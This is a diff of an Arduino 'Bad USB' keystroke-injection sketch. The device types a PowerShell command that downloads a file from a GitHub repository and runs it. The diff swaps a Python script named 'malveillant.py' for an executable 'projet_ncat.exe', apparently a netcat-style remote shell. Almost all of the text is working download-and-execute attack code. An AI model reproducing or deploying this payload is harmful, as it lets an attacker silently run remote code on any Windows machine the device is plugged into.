@@ -21,8 +21,8 @@ void setup() {
   Keyboard.write(KEY_RETURN);
   delay(1500);
 
-  String cmd = "https://raw.githubusercontent.com/Tristan654/Test/main/projet_ncat.py";
-  Keyboard.print("iwr " + cmd + " -o $env:USERPROFILE\\Downloads\\malveillant.py; python $env:USERPROFILE\\Downloads\\malveillant.py");
+  String cmd = "https://raw.githubusercontent.com/Tristan654/Projet_Bad_USB/main/Python_file/Executable_windows/dist/projet_ncat.exe";
+  Keyboard.print("iwr " + cmd + " -o $env:USERPROFILE\\Downloads\\projet_ncat.exe; Start-Process $env:USERPROFILE\\Downloads\\projet_ncat.exe");
   Keyboard.write(KEY_RETURN);
   Keyboard.releaseAll();
 }
